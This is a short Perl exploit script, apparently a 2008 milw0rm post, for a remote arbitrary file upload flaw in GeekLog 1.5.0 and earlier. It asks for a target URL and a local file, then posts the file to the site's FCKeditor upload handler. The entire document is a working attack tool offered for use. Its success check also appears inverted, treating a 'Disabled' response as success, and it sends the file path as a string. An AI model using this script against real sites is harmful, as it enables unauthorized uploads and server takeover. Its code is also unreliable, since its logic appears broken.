#!/usr/bin/perl

use warnings;
use strict;
use LWP::UserAgent;
use HTTP::Request::Common;

print <<INTRO;
+++++++++++++++++++++++++++++++++++++++++++++++++++++
+   GeekLog <= 1.5.0 Remote Arbitrary File Upload   +
+                                                   +
+         Discovered && Coded By: t0pP8uZz          +
+                                                   +
+ 0day?!?Most sites need custom configuration files +
+ for this exploit to actually work, anyway enjoy   +
+                                                   +
+   Discovered On: 20 August 2008 / milw0rm.com     +
+                                                   +
+      Script Download: http://www.geeklog.net      +
+++++++++++++++++++++++++++++++++++++++++++++++++++++

INTRO

print "Enter URL(ie: http://site.com): ";
    chomp(my $url=<STDIN>);
    
print "Enter File Path(path to local file to upload): ";
    chomp(my $file=<STDIN>);

my $ua = LWP::UserAgent->new;
my $re = $ua->request(POST $url.'/fckeditor/editor/filemanager/upload/php/upload.php',
                      Content_Type => 'form-data',
                      Content      => [ NewFile => $file ] );

if($re->is_success) {
    if( index($re->content, "Disabled") != -1 ) { print "Exploit Successfull! File Uploaded!\n"; }
    else { print "File Upload Is Disabled! Failed!\n"; }
} else { print "HTTP Request Failed!\n"; }

exit;

# milw0rm.com [2008-08-25]
